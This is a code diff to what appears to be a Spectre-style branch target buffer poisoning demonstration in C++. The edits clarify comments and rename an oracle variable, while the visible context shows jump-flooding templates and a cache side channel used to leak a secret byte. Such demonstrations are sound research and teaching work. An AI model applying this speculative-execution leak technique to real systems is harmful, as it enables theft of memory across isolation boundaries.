@@ -21,11 +21,12 @@
  * predictors. Since we need a universal and robust solution we have to
  * abstract from their peculiarities, so our solution is based on a brute-force
  * approach.
- * We flood the BTB with a plenty of jumps that do not follow typical patterns.
- * In this way we interleave jumps to real fetchers that fetch safe values with
- * jumps to dummy fetchers that do not fetch anything, but they get the unsafe
- * values. That leads to misspeculations (some of the dummy fetchers jumps are
- * misspeculated somewhere into the real fetcher destinations).
+ * We flood the Branch target buffer (BTB) with a plenty of jumps that do not
+ * follow typical patterns. In this way we interleave jumps to real readers
+ * (FirstActualRead and SecondActualRead) that fetch safe values with jumps to
+ * the dummy reader (DummyRead) that does not fetch anything, but gets the
+ * unsafe values. That leads to misspeculations (some of the dummy reader
+ * jumps are misspeculated somewhere into the real fetcher destinations).
  **/
 
 #include <array>
@@ -39,7 +40,7 @@ const char *public_data = "Hello, world!";
 const char *private_data = "It's a s3kr3t!!!";
 
 // Recursive templates to repeat code without using .rept and inline assembly.
-// Generates NOP instructions.
+// Generates NOP instructions (used in DummyRead).
 template<unsigned int N> struct Nops {
   SAFESIDE_ALWAYS_INLINE static inline void generate() {
     GenerateNop();
@@ -53,7 +54,8 @@ template<> struct Nops<0> {
   }
 };
 
-// Fetches an address N-times in a real reader.
+// Fetches an address N-times in a real reader (FirstActualRead or
+// SecondActualRead).
 template<unsigned int N> struct Fetches {
   SAFESIDE_ALWAYS_INLINE static inline void generate(const void *addr) {
     (void)*reinterpret_cast<const volatile char *>(addr);
@@ -67,7 +69,7 @@ template<> struct Fetches<0> {
   }
 };
 
-// Repeatedly indirectly invokes a real reader on a safe address in the
+// Repeatedly indirectly invokes a real reader on a safe address in
 // LeakByte.
 template<unsigned int N> struct SafeCalls {
   SAFESIDE_ALWAYS_INLINE static inline void generate(
@@ -165,7 +167,7 @@ SecondActualRead(const void *addr) {
 
 static char LeakByte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
 
   // Pointer to pointer to DummyRead so that we can easily flush it from
   // the cache and start speculative execution.
@@ -203,7 +205,7 @@ static char LeakByte(const char *data, size_t offset) {
       // NOP has always one byte on X86/64.
       dummy_ptr += 1;
 #  ifdef __clang__
-      // CLang uses movb to al as the blind fetch instruction and that has 2
+      // Clang uses movb to al as the blind fetch instruction and that has 2
       // bytes.
       first_ptr += 2;
       second_ptr += 2;
@@ -253,7 +255,7 @@ static char LeakByte(const char *data, size_t offset) {
       // Inline 100 jumps to a real read from 100 different source addresses to
       // the dynamic destination address (that has again 100 values).
       SafeCalls<100>::generate(
-          second_real_reader, isolated_oracle.data() + static_cast<size_t>(
+          second_real_reader, oracle.data() + static_cast<size_t>(
               data[safe_offset]));
 
       // Inline 100 jumps to the dummy read from 100 different source
@@ -262,12 +264,12 @@ static char LeakByte(const char *data, size_t offset) {
       // architecturally those jumps lead always into the dummy reader full of
       // nops.
       DummyCalls<100>::generate(
-          dummy_reader.get(), isolated_oracle.data() + static_cast<size_t>(
+          dummy_reader.get(), oracle.data() + static_cast<size_t>(
               data[offset]));
 
       // Another 100 jumps to real reads.
       SafeCalls<100>::generate(
-          first_real_reader, isolated_oracle.data() + static_cast<size_t>(
+          first_real_reader, oracle.data() + static_cast<size_t>(
               data[safe_offset]));
     }
 
